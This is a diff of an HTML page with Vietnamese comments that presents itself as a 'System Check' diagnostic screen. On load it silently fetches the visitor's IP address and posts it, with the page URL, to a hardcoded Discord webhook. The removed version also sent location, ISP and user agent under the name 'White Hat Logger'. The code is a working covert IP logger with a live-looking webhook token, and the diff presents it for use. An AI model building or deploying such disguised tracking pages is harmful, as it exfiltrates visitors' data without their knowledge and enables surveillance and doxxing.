@@ -3,100 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Diagnostic Tool</title>
+    <title>System Check</title>
     <style>
         body {
-            background-color: #050505;
-            color: #00ff41; /* Màu xanh Matrix */
+            background-color: #0a0a0a;
+            color: #00ff00;
             font-family: 'Courier New', Courier, monospace;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            overflow: hidden;
         }
-        .container {
-            border: 1px solid #00ff41;
-            padding: 30px;
-            background: rgba(0, 255, 65, 0.05);
-            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
-            text-align: center;
-            max-width: 500px;
+        .box {
+            border: 1px solid #00ff00;
+            padding: 20px;
+            background: #000;
+            box-shadow: 0 0 10px #00ff00;
         }
-        .loading {
+        .cursor {
             animation: blink 1s infinite;
         }
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0; }
-            100% { opacity: 1; }
-        }
+        @keyframes blink { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>[ SYSTEM MONITOR ]</h2>
-    <p id="status" class="loading">Đang phân tích cấu hình thiết bị...</p>
-    <div id="result" style="display:none; text-align: left; margin-top: 20px;">
-        <p>> IP: <span id="ip"></span></p>
-        <p>> Vị trí: <span id="loc"></span></p>
-        <p>> Trạng thái: <span style="color: white;">Đã gửi log bảo mật.</span></p>
-    </div>
+<div class="box">
+    <p>> System: Online</p>
+    <p id="ip-display">> Fetching IP...<span class="cursor">_</span></p>
+    <p id="status"></p>
 </div>
 
 <script>
-    // 1. THAY LINK WEBHOOK CỦA BẠN VÀO ĐÂY
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1472500024377081929/ulyOrybvyo_yS4bsuR74wDa66JTRjCApFM7JDWX_qKOKe_T4FcczBfnnTvRCwG_x-WgL";
+    // Cấu hình Webhook của bạn
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1472500024377081929/ulyOrybvyo_yS4bsuR74wDa66JTRjCApFM7JDWX_qKOKe_T4FcczBfnnTvRCwG_x-WgL";
 
-    async function getAndSendInfo() {
+    async function captureIP() {
         try {
-            // 2. Lấy dữ liệu IP và Vị trí từ API bên thứ 3
-            // ipapi.co là lựa chọn ổn định nhất cho client-side
-            const response = await fetch('https://ipapi.co/json/');
+            // 1. Lấy IP từ API công cộng (nhanh và ổn định)
+            const response = await fetch('https://api.ipify.org?format=json');
             const data = await response.json();
+            const userIP = data.ip;
 
-            // 3. Hiển thị lên màn hình (để người dùng thấy "pro")
-            document.getElementById('status').style.display = 'none';
-            document.getElementById('result').style.display = 'block';
-            document.getElementById('ip').innerText = data.ip;
-            document.getElementById('loc').innerText = `${data.city}, ${data.country_name}`;
+            // Hiển thị lên màn hình
+            document.getElementById('ip-display').innerText = "> Detected IP: " + userIP;
 
-            // 4. Chuẩn bị dữ liệu gửi đi Discord
+            // 2. Gửi dữ liệu về Discord Webhook
             const payload = {
-                username: "White Hat Logger",
-                avatar_url: "https://i.imgur.com/v7S18L4.png", // Icon hacker
+                content: "🚀 **Phát hiện truy cập mới!**",
                 embeds: [{
-                    title: "🔔 Phát hiện truy cập mới!",
-                    color: 15158332, // Màu đỏ
+                    title: "Thông tin kết nối",
+                    color: 65280, // Màu xanh lá
                     fields: [
-                        { name: "🌐 Địa chỉ IP", value: `\`${data.ip}\``, inline: true },
-                        { name: "📍 Vị trí", value: `${data.city}, ${data.region}, ${data.country_name}`, inline: true },
-                        { name: "🏢 Nhà mạng", value: data.org },
-                        { name: "📱 Thiết bị", value: navigator.userAgent },
-                        { name: "🔗 URL truy cập", value: window.location.href }
+                        { name: "🌐 Địa chỉ IP", value: `\`${userIP}\``, inline: true },
+                        { name: "🔗 URL", value: window.location.href, inline: true }
                     ],
-                    footer: { text: "Dữ liệu được lấy qua ipapi.co" },
                     timestamp: new Date().toISOString()
                 }]
             };
 
-            // 5. Gửi sang Discord
-            await fetch(DISCORD_WEBHOOK, {
+            await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
 
+            document.getElementById('status').innerText = "> Log sent successfully.";
+
         } catch (error) {
             console.error("Lỗi:", error);
-            document.getElementById('status').innerText = "Lỗi kết nối hệ thống.";
+            document.getElementById('status').innerText = "> Connection error.";
         }
     }
 
-    // Chạy hàm khi trang web tải xong
-    window.onload = getAndSendInfo;
+    // Tự động chạy khi mở trang
+    window.onload = captureIP;
 </script>
 
 </body>
